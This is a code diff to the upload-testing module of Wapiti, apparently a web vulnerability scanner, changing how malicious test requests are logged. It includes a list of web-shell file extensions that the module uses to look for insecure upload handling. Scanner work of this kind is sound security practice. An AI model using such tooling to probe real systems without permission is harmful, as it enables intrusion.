@@ -30,6 +30,7 @@ from wapitiCore.model import PayloadInfo
 from wapitiCore.net.response import Response
 from wapitiCore.net import Request
 from wapitiCore.net.scope import wildcard_translate
+from wapitiCore.net.web import http_repr
 from wapitiCore.parsers.html_parser import Html
 
 WEB_SHELL_EXTENSIONS = ["php", "phtml", "php7", "phps", "phar"]
@@ -147,7 +148,7 @@ class ModuleUpload(Attack):
                         parameter.display_name
                     )
                     log_red(Messages.MSG_EVIL_REQUEST)
-                    log_red(mutated_request.http_repr())
+                    log_red(http_repr(mutated_request))
                     log_red("---")
                     return
 
@@ -179,6 +180,6 @@ class ModuleUpload(Attack):
                                     parameter.display_name
                                 )
                                 log_red(Messages.MSG_EVIL_REQUEST)
-                                log_red(mutated_request.http_repr())
+                                log_red(http_repr(mutated_request))
                                 log_red("---")
                                 return
